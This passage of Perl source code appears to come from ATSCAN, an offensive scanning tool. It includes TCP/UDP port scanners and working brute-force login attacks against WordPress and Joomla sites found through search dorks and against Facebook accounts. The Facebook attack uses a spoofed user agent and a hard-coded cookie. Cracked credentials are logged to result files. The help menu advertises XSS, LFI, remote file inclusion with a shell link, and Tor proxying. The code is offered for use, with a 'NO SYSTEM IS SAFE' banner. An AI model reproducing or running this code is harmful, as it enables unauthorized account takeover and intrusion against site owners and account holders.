    if (((defined $mbasic and $mbasic eq "udp+tcp") || (defined $mall and $mall eq "udp+tcp") || (defined $muser and $muser eq "udp+tcp")) || ((defined $mbasic and $mbasic eq "tcp+udp") || (defined $mall and $mall eq "tcp+udp") || (defined $muser and $muser eq "tcp+udp"))) {
	  print "TCP + UDP";
	}
    if ((defined $mstart) && (defined $mend)) {
      print "[$mstart To $mend] ";
    }
    print "\n";
  }
}
############################################################################################################################################################################################
############################################################################################################################################################################################
## BASIC PORTS SCAN
sub basic {
  ifgettargetlist();
  searchexitstargets();
  print "\033[1;37m[ ] -----------------------------------------------------------------------\n[!] ";
  timer();
  print "STARTING PORTS BASIC SCAN ...\n";
  print "\033[1;37m[ ] -----------------------------------------------------------------------\n";
  forwait();
  $count=0;
  open (TEXT, $Bin.'/search.txt');
  while (my $URL = <TEXT>) {
    $count++;
	chomp $URL;
	$URL = checkip($URL);
	print "\033[1;37m    ";
	timer();
    print "[Target $count/";
	countsearchlist();
	print "\033[1;33m]\n";
	print "\033[1;37m    TARGET: ";
	print "\033[0;37m$URL \n";
	resumeportscan();
	$URL=$URL;
    $type=$_[0];
    $closed1=0;
    @PORTS=(20,21,22,23,24,25,35,37,53,80,88,130,135,161,162,443,445,530,546,547,561,1433,1434,1701,1723,2082,2087,2121,2222,3306,3389,8080);
    foreach $port1(@PORTS){
      $socket = IO::Socket::INET->new(PeerAddr=>"$URL",PeerPort=>"$port1",Proto=>"$type",Timeout=>"0.5") or $closed1++;
	  if (defined $socket) {
        close $socket;
	  }
	  print "\033[1;37m    TYPE:  ";
      print "$type  ";
	  print "\033[1;37mPORT:  ";
      print "$port1  ";
	  print "\033[1;37mINFO:  ";
      if ($closed1==0){
	    if (defined $beep) {print chr(7);}
	    print "\033[0;32mOpen!\n";
	  }else{
	    print "\033[0;31mClosed!\n";
	  }
      $closed1=0;
    }
    print "    \033[1;37m[ ] -------------------------------------------------------------------\n";
  }
  print "\n";
  subfin();}
############################################################################################################################################################################################
############################################################################################################################################################################################
## BASIC2 PORTS SCAN
sub basic2 {
  ifgettargetlist();
  searchexitstargets();
  print "\033[1;37m[ ] -----------------------------------------------------------------------\n[!] ";
  timer();
  print "STARTING PORTS BASIC SCAN ...\n";
  print "\033[1;37m[ ] -----------------------------------------------------------------------\n";
  forwait();
  $count=0;
  open (TEXT, $Bin.'/search.txt');
  while (my $URL = <TEXT>) {
    $count++;
	chomp $URL;
	$URL = checkip($URL);
	print "\033[1;37m    ";
	timer();
    print "[Target $count/";
	countsearchlist();
	print "\033[1;33m]\n";
	print "\033[1;37m    TARGET: ";
	print "\033[0;37m$URL \n";
	resumeportscan();
	$URL=$URL;
    $closed2=0;
    $closed3=0;
    @PORTS=(20,21,22,23,24,25,35,37,53,80,88,130,135,161,162,443,445,530,546,547,561,1433,1434,1701,1723,2082,2087,2121,2222,3306,3389,8080);
    foreach $port2(@PORTS){
       $socket = IO::Socket::INET->new(PeerAddr=>"$URL",PeerPort=>"$port2",Proto=>"tcp",Timeout=>"0.5") or $closed2++;
	   if (defined $socket) {
         close $socket;
         $closed2=0;
	    }
        $socket2 = IO::Socket::INET->new(PeerAddr=>"$URL",PeerPort=>"$port2",Proto=>"udp",Timeout=>"0.5") or $closed3++;
		if (defined $socket2) {
          close $socket2;
	    }	
	    if ($closed2==0){
	    print "\033[1;37m    TYPE:  ";
        print "tcp  ";
	    print "\033[1;37mPORT:  ";
        print "$port2  ";
	    print "\033[1;37mINFO:  ";
        if (defined $beep) {print chr(7);}
		print "\033[0;32mOpen!\n";
      }else{
	    print "\033[1;37m    TYPE:  ";
        print "tcp  ";
	    print "\033[1;37mPORT:  ";
        print "$port2  ";
	    print "\033[1;37mINFO:  ";
        print "\033[0;31mClosed! \n";
      }
	  
      if ($closed3==0){
	    print "\033[1;37m    TYPE:  ";
        print "udp  ";
	    print "\033[1;37mPORT:  ";
        print "$port2  ";
	    print "\033[1;37mINFO:  ";
        if (defined $beep) {print chr(7);}
		print "\033[0;32mOpen!\n";
      }else{
	    print "\033[1;37m    TYPE:  ";
        print "udp  ";
	    print "\033[1;37mPORT:  ";
        print "$port2  ";
	    print "\033[1;37mINFO:  ";
        print "\033[0;31mClosed!\n";
      }
	  $closed2=0;
      $closed3=0;
    }
    print "    \033[1;37m[ ] -------------------------------------------------------------------\n";
  }
  print "\n";
  subfin();}
############################################################################################################################################################################################
############################################################################################################################################################################################
## COMPLETE PORTS SCAN
sub complete {
  ifgettargetlist();
  searchexitstargets();
  print "\033[1;37m[ ] -----------------------------------------------------------------------\n[!] ";
  timer();
  print "STARTING PORTS COMPLETE SCAN ...\n";
  print "\033[1;37m[ ] -----------------------------------------------------------------------\n";
  forwait();
  $type2=$_[0];
  $count=0;
  open (TEXT, $Bin.'/search.txt');
  while (my $URL = <TEXT>) {
    $count++;
	chomp $URL;
	$URL = checkip($URL);
	$closed3=0;
    $port3=1;
	print "\033[1;37m    ";
	timer();
    print "[Target $count/";
	countsearchlist();
	print "\033[1;33m]\n";
    print "\033[1;37m    TARGET: ";
	print "\033[0;37m$URL \n";
	resumeportscan();
    while ($port3<=65535){
      $socket = IO::Socket::INET->new(PeerAddr=>"$URL",PeerPort=>"$port3",Proto=>"$type2") or $closed3++;
	  if (defined $socket) {
        close $socket;
	  }
	  print "\033[1;37m    TYPE:  ";
      print "$type2  ";
	  print "\033[1;37mPORT:  ";
      print "$port3  ";
	  print "\033[1;37mINFO:  ";
      if ($closed3==0){
	  if (defined $beep) {print chr(7);}
	    print "\033[0;32mOpen!\n";
	  }else{
	    print "\033[0;31mClosed!\n";
	  }
    }
	$closed3=0;
    $port3++;
    print "    \033[1;37m[ ] -------------------------------------------------------------------\n";
  }
  print "\n";
  subfin();}
############################################################################################################################################################################################
############################################################################################################################################################################################
## COMPLETE2 PORTS SCAN
sub complete2 {
  ifgettargetlist();
  searchexitstargets();
  print "\033[1;37m[ ] -----------------------------------------------------------------------\n[!] ";
  timer();
  print "STARTING PORTS COMPLETE SCAN ...\n";
  print "\033[1;37m[ ] -----------------------------------------------------------------------\n";
  forwait();
  $count=0;
  $closed4=0;
  $closed5=0;
  $port4=1;
  while ($port4<=65535){
  open (TEXT, $Bin.'/search.txt');
    while (my $URL = <TEXT>) {
      $count++;
	  chomp $URL;
	  $URL = checkip($URL);
	  print "\033[1;37m    ";
	  timer();
	  print "[$count/";
	  countsearchlist();
	  print "\033[1;37m]\n";
	  print "\033[1;37m    TARGET: ";
	  print "\033[0;37m$URL \n";
	  resumeportscan();
      $socket = IO::Socket::INET->new(PeerAddr=>"$URL",PeerPort=>"$port4",Proto=>"tcp") or $closed4++;
	  if (defined $socket) {
        close $socket;
	  }
	  $socket2 = IO::Socket::INET->new(PeerAddr=>"$URL",PeerPort=>"$port4",Proto=>"udp") or $closed5++;
	  if (defined $socket2) {
        close $socket2;
	  }
      if ($closed4==0){
	    print "\033[1;37m    TYPE:  ";
        print "tcp  ";
	    print "\033[1;37mPORT:  ";

        print "$port4  ";
	    print "\033[1;37mINFO:  ";
        if (defined $beep) {print chr(7);}
		print "\033[0;32mOpen!\n";
      }else{
	    print "\033[1;37m    TYPE:  ";
        print "tcp  ";
	    print "\033[1;37mPORT:  ";
        print "$port4  ";
	    print "\033[1;37mINFO:  ";
        print "\033[0;31mClosed!\n";
      }
      if ($closed5==0){
	    print "\033[1;37m    TYPE:  ";
        print "udp  ";
	    print "\033[1;37mPORT:  ";
        print "$port4  ";
	    print "\033[1;37mINFO:  ";
        if (defined $beep) {print chr(7);}
		print "\033[0;32mOpen!\n";
      }else{
	    print "\033[1;37m    TYPE:  ";
        print "udp  ";
	    print "\033[1;37mPORT:  ";
        print "$port4  ";
	    print "\033[1;37mINFO:  ";
        print "\033[0;31mClosed!\n";
      }
    }
    $closed4=0;
    $closed5=0;
    $port4++;
    print "    \033[1;37m[ ] -------------------------------------------------------------------\n";
  }
  
  print "\n";
  subfin();}
############################################################################################################################################################################################
############################################################################################################################################################################################
## SELECTIVE PORTS SCAN
sub subuser {
  if ((!defined $mstart) || (!defined $mend)) {
    print "\033[0;33m[..][+] Type Start Of The Port : ";
        $mstart=<STDIN>;
    chomp($mstart);
    print "\033[0;33m[..][+] Type End Of The Port : ";
        $mend=<STDIN>;
    chomp($mend);
  }
}
############################################################################################################################################################################################
############################################################################################################################################################################################
## SELECTIVE PORTS SCAN
sub user {
  ifgettargetlist();
  searchexitstargets();
  print "\033[1;37m[ ] -----------------------------------------------------------------------\n[!] ";
  timer();
  print "STARTING PORTS SELECTIVE SCAN ...\n";
  print "\033[1;37m[ ] -----------------------------------------------------------------------\n";
  forwait();
  if (defined $muser){
    $type3=$muser;
  }else{
    $type3=$_[0];
  }
  $count=0;
  $type3=$_[0];
  $closed6=0;
  while ($mstart<=$mend){
  open (TEXT, $Bin.'/search.txt');
    while (my $URL = <TEXT>) {
      $count++;
	  chomp $URL;
	  $URL = checkip($URL);
	  print "\033[1;37m    ";
	  timer();
	  print "[$count/";
	  countsearchlist();
	  print "\033[1;37m]\n";
	  print "\033[1;37m    [!] TARGET: ";
	  print "\033[0;37m$URL \n";
	  resumeportscan();
      $socket = IO::Socket::INET->new(PeerAddr=>"$URL",PeerPort=>"$mstart",Proto=>"$type3") or $closed6++;
      if (defined $socket) {
        close $socket;
	  }
	  print "\033[1;37m    TYPE:  ";
      print "$type3  ";

	  print "\033[1;37mPORT:  ";
      print "$mstart  ";
	  
	  print "\033[1;37mINFO:  ";
      if ($closed6==0){
	  if (defined $beep) {print chr(7);}
	    print "\033[0;32mOpen!\n";
	  }else{
		print "\033[0;31mClosed!\n";
      }
    }
    $closed6=0;
    $mstart++;
    print "    \033[1;37m[ ] -------------------------------------------------------------------\n";
  }
  print "\n";
  subfin();}
############################################################################################################################################################################################
############################################################################################################################################################################################
## SELECTIVE2 PORTS SCAN
sub user2 {
  ifgettargetlist();
  searchexitstargets();
  print "\033[1;37m[ ] -----------------------------------------------------------------------\n[!] ";
  timer();
  print "STARTING PORTS SELECTIVE SCAN ...\n";
  print "\033[1;37m[ ] -----------------------------------------------------------------------\n";
  forwait();
  $count=0;
  $closed7=0;
  $closed8=0;
  while ($mstart<=$mend){
  open (TEXT, $Bin.'/search.txt');
  while (my $URL = <TEXT>) { ###
	 chomp $URL;
	 $URL = checkip($URL);
	 $count++;
  	 print "\033[1;37m    ";
	 timer();
	 print "[$count/";
	 countsearchlist();
	 print "\033[1;37m]\n";
	 print "\033[1;37m    TARGET: ";
	 print "\033[0;37m$URL \n";
	 resumeportscan();
     $socket = IO::Socket::INET->new(PeerAddr=>"$URL",PeerPort=>"$mstart",Proto=>"tcp") or $closed7++;
	 if (defined $socket) {
       close $socket;
	 }
     $socket2 = IO::Socket::INET->new(PeerAddr=>"$URL",PeerPort=>"$mstart",Proto=>"udp") or $closed8++;
	 if (defined $socket2) {
       close $socket2;
	 }
      if ($closed7==0){
	    print "\033[1;37m    TYPE:  ";
        print "tcp  ";
	    print "\033[1;37mPORT:  ";
        print "$mstart  ";
	    print "\033[1;37mINFO:  ";
        if (defined $beep) {print chr(7);}
		print "\033[0;32mOpen!\n";
      }else{
	    print "\033[1;37m    TYPE:  ";
        print "tcp  ";
	    print "\033[1;37mPORT:  ";
        print "$mstart  ";
	    print "\033[1;37mINFO:  ";
        print "\033[0;31mClosed!\n";
      }
      if ($closed8==0){
	    print "\033[1;37m    TYPE:  ";
        print "udp  ";
	    print "\033[1;37mPORT:  ";
        print "$port4  ";
	    print "\033[1;37mINFO:  ";
        if (defined $beep) {print chr(7);}
		print "\033[0;32mOpen!\n";
      }else{
	    print "\033[1;37m    TYPE:  ";
        print "udp  ";
	    print "\033[1;37mPORT:  ";
        print "$port4  ";
	    print "\033[1;37mINFO:  ";
        print "\033[0;31mClosed!\n";
      }
    }
    $closed7=0;
    $closed8=0;
    $mstart++;
    print "    \033[1;37m[ ] -------------------------------------------------------------------\n";
  }
  print "\n";
  subfin();}
############################################################################################################################################################################################
############################################################################################################################################################################################
## BRUTE FORCE WORDPRESS SITES
sub BFmwpsites {
   if (-e $Bin.'/scan.txt'){ unlink $Bin.'/scan.txt';}
  testconection();
  if (!defined $mlevel) {
    targetlist();
  }
  print "\033[1;37m[ ] -----------------------------------------------------------------------\n[!] ";
  timer();
  print "STARTING BRUTE FORCE WORDPRESS SITES SCAN ...\n";
  print "\033[1;37m[ ] -----------------------------------------------------------------------\n";
  forwait();
  $count=0;
  open (TEXT, $Bin.'/search.txt');
  while (my $URL = <TEXT>) {
    $count++;
	chomp $URL;
    $URL = checkurltype($URL);
	if($URL !~ /http:\/\//) { $URL = "http://$URL"; };	
	my $printarget = $URL;
	if (index($URL, 'http://') != -1) {
	  $URL =~ s/http:\/\///g;
	}
	$URL =~ s/\/.*//s;
	if($URL !~ /http:\/\//) { $URL = "http://$URL"; };	
	print "\033[1;33m    ";
	timer();
	print "[Target $count/";
	countsearchlist();
	print "\033[1;33m]\n";
	print "\033[1;37m    TARGET: ";
	print "\033[0;37m$printarget\n";	    
    if (defined $password) {
      my $password=$password;
    }
    $URL1 = $URL."/wp-login.php";
	$URL1 =~ s/ //g;
    $request = HTTP::Request->new('GET', $URL1);
    my $response = $ua->request($request);
    my $status = $response->code;
	print "\033[1;37m    CMS:    ";
    if ($response->code==200) {
	print "\033[0;32mWordpress!\n";
	open(PASS,"<$password") or die "[!] Can not find $!";
    while(<PASS>){
        chomp($_);
		$_ =~ s/([^^A-Za-z0-9\-_.!~*'()])/ sprintf "%%%0x", ord $1 /eg;
        my $ua = new LWP::UserAgent;
        my $response = $ua->post($URL1, 
                    { 'log' => $username, 
                      'pwd' => $_,
                      'wp-submit' => 'Log in',
                    });
        my $code = $response->code;
        my $content = $response->content;
        print "\033[1;37m    USER:   ";
	    print "\033[0;37m$username\n";
        $_ =~ s/%([0-9A-Fa-f]{2})/chr(hex($1))/eg;
        print "\033[1;37m    PASS:   ";
	    print "\033[0;37m$_\n";
        print "\033[1;37m    SCAN:   ";
	    my $pa='Bienvenido|Welcome|Bienvenue|log off|Cerrar Sesion|Se deconnecter';
        if ($content =~ /$pa/) {
		  if (defined $beep) {print chr(7);}
	      print "\033[0;32m$URL1\n";
          print "    \033[1;37m[ ] -------------------------------------------------------------------\n";
	      open (LOG, '>>', $Bin.'/scan.txt');
          print LOG "$URL1\n   $1\n";
          close (LOG);
		  last;
        }else{
	      print "\033[0;31mNot Vulnerable!\n";
	    }
      }
	}else{
	  print "\033[0;31mNot Wordpress!\n";
	}
    print "    \033[1;37m[ ] -------------------------------------------------------------------\n";
    close(PASS);
  }
  close(TEXT);
  if (-e $Bin.'/scan.txt') {
  	fincontinuemodule();
    if (!defined $joombf) {
	  if (defined $output) {
	    $listme = $Bin.'/scan.txt';
		$save = "$outdir/crackedwp_scan.txt";
		if (-e $save) {unlink $save;}
        use File::Copy qw(copy);
	    copy $listme, $save;
		print "\033[0;32m[!] Results saved in $save!\n";
	  }
      subfin();
	  unlink $Bin.'/search.txt';
	}
	unlink $Bin.'/scan.txt';
  }else{
	negativeexit();
  }
}
############################################################################################################################################################################################
############################################################################################################################################################################################
## BRUTE FORCE JOOBLA SITES
sub BFmjoomsites {
  if (-e $Bin.'/scan.txt'){ unlink $Bin.'/scan.txt';}
  testconection();
  if (!defined $mlevel) {
    targetlist();
  }
  print "\033[1;37m[ ] -----------------------------------------------------------------------\n[!] ";
  timer();
  print "STARTING BRUTE FORCE JOOMLA SITES SCAN ...\n";
  print "\033[1;37m[ ] -----------------------------------------------------------------------\n";
  forwait();
  $count=0;
  open (TEXT, $Bin.'/search.txt');
  while (my $URL = <TEXT>) {
    $count++;
	chomp $URL;
    $URL = checkurltype($URL);
	if($URL !~ /http:\/\//) { $URL = "http://$URL"; };	
	my $printarget = $URL;
	if (index($URL, 'http://') != -1) {
	  $URL =~ s/http:\/\///g;
	}
	$URL =~ s/\/.*//s;
	if($URL !~ /http:\/\//) { $URL = "http://$URL"; };	
	print "\033[1;37m    ";
	timer();
    print "[Target $count/";
	countsearchlist();
	print "\033[1;33m]\n";
	print "\033[1;37m    TARGET: ";
	print "\033[0;37m$printarget\n";	    
    if (defined $password) {
      my $password=$password;
    }
    $URL1 = $URL."/administrator/index.php";
	$URL1 =~ s/ //g;
    checkedurl();   
    $request = HTTP::Request->new('GET', $URL1);
    my $response = $ua->request($request);
    my $status = $response->code;
	print "\033[1;37m    CMS:    ";
    	
	if ($response->code==200) {
	  print "\033[0;32mJoomla!\n";
	  open(PASS,"<$password") or die "[!] Can not find $!";
      while(<PASS>){
        chomp($_);
		$_ =~ s/([^^A-Za-z0-9\-_.!~*'()])/ sprintf "%%%0x", ord $1 /eg;
        my $ua = new LWP::UserAgent;
        my $response = $ua->post($URL1, 
                      { 'username' => $username, 
                        'passwd' => $_,
                        'submit' => 'Log in',
                      });
        my $code = $response->code;
        my $content = $response->content;
        print "\033[1;37m    USER:   ";
	    print "\033[0;37m$username\n";       
        print "\033[1;37m    PASS:   ";
        $_ =~ s/%([0-9A-Fa-f]{2})/chr(hex($1))/eg;
	    print "$_\n";
        print "\033[1;37m    SCAN:   ";
	    my $pa='Panel de Control|Control Panel|Bienvenue|log off|Cerrar Sesion|Se deconnecter';
        if ($content =~ /$pa/) {
		  if (defined $beep) {print chr(7);}
	      print "\033[0;32m$URL1\n";
          print "    \033[1;37m[ ] -------------------------------------------------------------------\n";
		  open (LOG, '>>', $Bin.'/scan.txt');
          print LOG "$URL1\n   $1\n";
          close (LOG);
		  last;
        }else{
	      print "\033[0;31mNot Vulnerable!\n";
	    }
      }
	}else{
	  print "\033[0;31mNot Joomla!\n";
	}
    print "    \033[1;37m[ ] -------------------------------------------------------------------\n";
    close(PASS);
  }
  close(TEXT);
  if (-e $Bin.'/scan.txt') {
  	fincontinuemodule();
	if (defined $output) {
	  $listme = $Bin.'/scan.txt';
      $save = "$outdir/crackedjoom_scan.txt";
	  if (-e $save) {unlink $save;}
      use File::Copy qw(copy);
	  copy $listme, $save;
	  print "\033[0;32m[!] Results saved in $save!\n";
	}
    subfin();
	unlink $Bin.'/search.txt';
	unlink $Bin.'/scan.txt';
  }else{
	negative2();
  }
  exit();
}
############################################################################################################################################################################################
############################################################################################################################################################################################
## BRUTE FORCE FACEBOOK
sub fbbf {
  use Net::SSLeay::Handle;
  scandetail();
  if (-e $Bin.'/scan.txt'){ unlink $Bin.'/scan.txt';}
  testconection();
  print "\033[1;37m[ ] -----------------------------------------------------------------------\n[!] ";
  timer();
  print "STARTING BRUTE FORCE FACEBOOK SCAN ...\n";
  print "\033[1;37m[ ] -----------------------------------------------------------------------\n";
  forwait();
  open(PASS,"<$password") or die "[!] Can not find $!";
  while(<PASS>){
    chomp($_);
    $_ =~ s/([^^A-Za-z0-9\-_.!~*'()])/ sprintf "%%%0x", ord $1 /eg;
    my $a = "POST /login.php HTTP/1.1";
    my $b = "Host: www.facebook.com";
    my $c = "Connection: close";
    my $e = "Cache-Control: max-age=0";
    my $f = "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8";
    my $g = "Origin: https://www.facebook.com";   #my $xh = "User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.31 (KHTML, like Gecko) Chrome/26.0.1410.63 Safari/537.31";
    my $h = "User-Agent: Mozilla/5.0 (".$sys[int rand @sys].";) ".$vary[int rand @vary];
    my $i = "Content-Type: application/x-www-form-urlencoded";
    my $j = "Accept-Encoding: gzip,deflate,sdch";
    my $k = "Accept-Language: en-US,en;q=0.8";
    my $l = "Accept-Charset: ISO-8859-1,utf-8;q=0.7,*;q=0.3";
    my $cookie = "cookie: datr=80ZzUfKqDOjwL8pauwqMjHTa";
    my $post = "lsd=AVpD2t1f&display=&enable_profile_selector=&legacy_return=1&next=&profile_selector_ids=&trynum=1&timezone=300&lgnrnd=031110_Euoh&lgnjs=1366193470&email=$username&pass=$_&default_persistent=0&login=Log+In";
    my $cl = length($post);
    my $d = "Content-Length: $cl";
    my ($host, $port) = ("www.facebook.com", 443);
    tie(*SSL, "Net::SSLeay::Handle", $host, $port);
    print SSL "$a\n";
    print SSL "$b\n";
    print SSL "$c\n";
    print SSL "$d\n";
    print SSL "$e\n";
    print SSL "$f\n";
    print SSL "$g\n";
    print SSL "$h\n";
    print SSL "$i\n";
    print SSL "$j\n";
    print SSL "$k\n";
    print SSL "$l\n";
    print SSL "$cookie\n\n";
    print SSL "$post\n";
    my $success;
    while(my $result = <SSL>){
      if($result =~ /Location(.*?)/) {
        $success = $1;
      }
    }
    $_ =~ s/%([0-9A-Fa-f]{2})/chr(hex($1))/eg;
    print "\033[1;37m    MAIL:   ";
    print "\033[0;37m$username\n";
    print "\033[1;37m    PASS:   ";
    print "\033[0;37m$_\n";
    print "\033[1;37m    SCAN:   ";
    if (defined $success) {  
	  if (defined $beep) {print chr(7);}
      print "\033[0;32mCracked!\n";
      print "    \033[1;37m[ ] -------------------------------------------------------------------\n";
      open (LOG, '>>', $Bin.'/scan.txt');
      print LOG "$username >> $_\n";
      close (LOG);   
      close SSL;
	  last;
    }else{
      print "\033[0;31mFailed!\n";
      close SSL;
    } 
    print "    \033[1;37m[ ] -------------------------------------------------------------------\n";
  }
  close(PASS);
  if (-e $Bin.'/scan.txt') {
    if (defined $output) {
	  $listme = $Bin.'/scan.txt';
      $save = "$outdir/crackedfb_scan.txt";
	  if (-e $save) {unlink $save;}
      use File::Copy qw(copy);
	  copy $listme, $save;
	  print "\033[0;32m[!] Results saved in $save!\n";
    }
	fincontinuemodule();
    print "\033[1;37m[ ] --------------------------------------------------------------------- [ ]\n";
	subfin();
  }else{
	negative2();
  }
  exit();
}
############################################################################################################################################################################################
############################################################################################################################################################################################
## ABOUT TOOL
sub mabout {
  print "\033[1;37m[ ] --------------------------------------------------------------------------- \n";
  print "\033[1;36m
     [+]================================================================[+]
     [+]--------------              ATSCAN V 7.8          --------------[+]
     [+]================================================================[+]
     [+]--------------           AlisamTechnology         --------------[+]
     [+]------ https://www.fb.com/Forces.des.tempetes.marocaines  ------[+]
     [+]------        https://www.youtube.com/user/aliartes       ------[+]
     [+]================================================================[+]
     [+]======================    DISCLAIMER !!!  ======================[+]
     [+]  We will not be responsible or liable, directly or indirectly  [+]
     [+]  in any way for any loss or damage of any kind incurred as     [+]
     [+]                  a result of use of our material !!            [+]
     [+]================================================================[+]
     [+]                      NO SYSTEM IS SAFE !!!                     [+]
     [+]       If you like my tool you must know that i never           [+]
     [+]                      studied scripting!                        [+]
     [+]                NO Monopoly for the Knowledge!                  [+]
     [+]================================================================[+]
    \n";
}
############################################################################################################################################################################################
############################################################################################################################################################################################
## HELP MENU
sub help {
  print "\033[1;37m[ ] --------------------------------------------------------------------- [ ]\n\n";
  print "\033[1;33m";
  print "[..] HELP:: \n";
  print "\033[0;37m";
  print "   --proxy       | Set tor proxy [EX: socks://localhost:9050]\n";
  print "   --dork        | Dork to search [Ex: house,cars,hotel] \n";
  print "   --level       | Scan level (+- Number of page results to scan) \n";
  print "   --valid       | Text for validate results \n";
  print "   --ifinurl     | Text to validate target url \n";
  print "   --isup        | Check http status 200. \n";
  print "   --unique      | Get targets with exact dork matching.\n";
  print "   --exp         | Exploit\n";
  print "   -t            | Target \n";
  print "   --sqlmap      | Sqlmaping xss results \n";
  print "   -p            | Set xss / sqlmap test parameter \n";
  print "   --xss         | Xss scan \n";
  print "   --lfi         | Local file inclusion \n";
  print "   --joomrfi     | Scan for joomla local file inclusion\n";
  print "   --shell       | Shell link [Ex: http://www.site.com/shell.txt] \n";
  print "   --wpadf       | Scan wordpress sites for arbitery file download\n";
  print "   --admin       | Get site admin page \n";
  print "   --shost       | Get site subdomains \n";
  print "   --ports       | Scan server ports \n";
  print "   --start       | Start scan port \n";
  print "   --end         | End scan port \n";
  print "   --all         | Complete mode \n";
  print "   --basic       | Basic mode \n";
  print "   --select      | Select mode you can set rang of ports \n";
  print "   --sites       | Sites in the server \n";
  print "   --wp          | Wordpress sites in the server\n";
  print "   --joom        | Joomla sites in the server\n";
  print "   --upload      | Get sites with upload files in the server  \n";
  print "   --zip         | Get sites with zip files in the server \n";
  print "   --md5         | Convert to md5 \n";
  print "   --encode64    | Encode base64 string \n";
  print "   --decode64    | decode base64 string \n";
  print "   --dom         | Domain name [Ex: site.com] \n";
  print "   --TARGET      | Will be replaced by target in command \n";
  print "   --command     | Extern Command to execute\n";
  print "   --replace     | String to replace \n";
  print "   --with        | String to replace with \n";
  print "   --email       | Get emails \n";
  print "   --save        | Save scan.\n";
  print "   --rang        | Set ip range [Ex: --rang 124.12.10.144-22.36.14.152]\n";
  print "   --wpbf        | Wordpress Login Brute Force\n";
  print "   --joombf      | Joomla Login Brute Force\n";
  print "   --fbbf        | Facebook Login Brute Force\n";
  print "   --user        | Set Username Login FB/WP/JOOM Brute Force\n";
  print "   --pass        | Set Password List Login FB/WP/JOOM Brute Force\n";
  print "   --nobanner    | Hide tool banner\n";
  print "   --beep        | Produce beep sount if positive scan found.\n";
  print "   --noinfo      | Jump extra results info.\n";
  print "   --noprocess   | Hide validation process.\n";
  print "   --update      | Check and update tool\n\n";

  print "\033[1;33m[..] EXAMPLES: \n\n";
  print "\033[1;37m  Tor: \n";
  print "  ......................\n";
  print "\033[0;37m    --proxy <proxy>\n\n";
  
  print "\033[1;37m  Search engine: \n";
  print "  ......................\n";
  print "\033[0;37m";
  print "    Search: --dork <dork> --level <level> \n";
  print "    Search + get ip: --dork <dork> --level <level> --ip\n";
  print "    Search + get ip + server: --dork <dork> --level <level> --ip --server\n";
  print "    Search with many dorks: --dork <dork1,dork2,dork3> --level <level> \n";
  print "    Search + get emails: --dork <dorks.txt> --level <level> --email \n";
  print "    Search + get site emails: --dork <site:site.com> --level <level> --email \n";
  print "    Search + get ip+server: --dork <dorks.txt> --level <level> \n";
  print "    Search + set save file: --dork <dorks.txt> --level <level> --save\n";
  print "    Search + Replace + Exploit: --dork <dorks.txt> --level <level> --replace <string> --with <string> --valid <string>\n\n";
  
  print "\033[1;37m  Subscan from Serach Engine: \n";
  print "  ......................\n";
  print "\033[0;37m";
  print "    Search + Exploitation: --dork <dork> --level <10> --xss/--lfi/--wp ... \n";
  print "    Search + Server Exploitation: -t <ip> --level <10> --xss/--lfi/--wp ... \n";
  print "    Search + Replace + Exploit: --dork <dork> --level <10> --replace <string> --with <string> --exp <exploit> --xss/--lfi/--wp ... \n\n";
  
  print "\033[1;37m  Validation: \n";
  print "  ......................\n";
  print "\033[0;37m";
  print "    Search + Url Validation: --dork <dork> --level <10> --ifinurl <string>\n";
  print "    Search + dork Validation: --dork <dork> --level <10> --unique\n";
  print "    Search + Exploit + Validation: --dork <dork> --level <10> --exp --isup/--valid <string>\n";
  print "    Search + Server Exploit + Validation: -t <ip> --level <10> --exp --isup/--valid <string>\n";
  print "    Search + Replace + Exploit: --dork <dork> --level <10> --replace <string> --with <string> --isup/--valid <string>\n\n";
  print "\033[1;37m  Use List / Target: \n";
  print "  ......................\n";
  print "\033[0;37m";
  print "    -t <target/targets.txt> --exp --isup/--valid <string>\n";
  print "    -t <target/targets.txt> --xss/--lfi .. \n\n";
  print "\033[1;37m  Server: \n";
  print "  ......................\n";
  print "\033[0;37m";
  print "    Get Server sites: -t <ip> --level <value> --sites\n";
  print "    Get Server wordpress sites: -t <ip> --level <value> --wp \n";
  print "    Get Server joomla sites: -t <ip> --level <value> --joom \n";
  print "    Get Server upload sites: -t <ip> --level <value> --upload \n";
  print "    Get Server zip sites files: -t <ip> --level <value> --zip \n";
  print "    WP Arbitry File Download: -t <ip> --level <value> --wpadf \n";
  print "    Joomla RFI: -t <ip> --level <1> --joomfri --shell <shell link>\n";
  print "    Scan basic tcp (quick): -t <ip> --ports --basic tcp\n";
  print "    Scan basic udp basic (quick): -t <ip> --ports --basic udp\n";
  print "    Scan basic udp+tcp: -t <ip> --ports --basic udp+tcp\n";
  print "    Scan complete tcp: -t <ip> --ports --all tcp\n";
  print "    Scan complete udp: -t <ip> --ports --all udp\n";
  print "    Scan complete udp+tcp: -t <ip> --ports --all udp+tcp\n";
  print "    Scan range tcp: -t <ip> --ports --select  tcp --start <value> --end <value>\n";
  print "    Scan range udp: -t <ip> --ports --select  udp--start <value> --end <value>\n";
  print "    Scan range udp + tcp: -t <ip> --ports --select  udp+tcp --start <value> --end <value>\n\n";
  print "\033[1;37m  Encode / Decode: \n";
  print "  ......................\n";
  print "\033[0;37m";
  print "    Generate MD5: --md5 <string> \n";
  print "    Encode base64: --encode64 <string>  \n";
  print "    Decode base64: --decode64 <string> \n\n";
  
  print "\033[1;37m  External Command: \n";
  print "  ......................\n";
  print "\033[0;37m";
  print "   --dork <dork/dorks.txt> --level <level> --command \"curl -v --TARGET\" \n";
  print "   -t <target/targets.txt> --command \"curl -v --TARGET\" \n\n";
  
  print "\033[1;37m  Multiple Scan: \n";
  print "  ......................\n";
  print "\033[0;37m";
  print "    --dork <dork> --level <10> --xss/--lfi/--wp..\n";
  print "    --dork <dork> --level <10> --replace <string> --with <string> --exp <exploit> --xss --lfi --wp..\n";
  print "    -t <ip> --level <10> --xss --lfi --wp..\n";
  print "    -t <targets> --xss --lfi --wp..\n\n";
  
  print "\033[1;37m  Brute Force Facebook Login: \n";
  print "  ......................\n";
  print "\033[0;37m    --fbbf --user <email> --pass password.txt\n\n";
  
  print "\033[1;37m  Brute Force WP/JOOM Login: \n";
  print "  ......................\n";
  print "\033[0;37m";
  print "    --dork <dork> --level <10> --wpbf/--joombf --user <user> --pass password.txt \n\n";
  
  print "\033[1;37m  Check and update: \n";
  print "  ......................\n";
  print "\033[0;37m    --update\n\n"; 
  print "\033[1;37m[ ] --------------------------------------------------------------------------- \n";
}
############################################################################################################################################################################################
############################################################################################################################################################################################
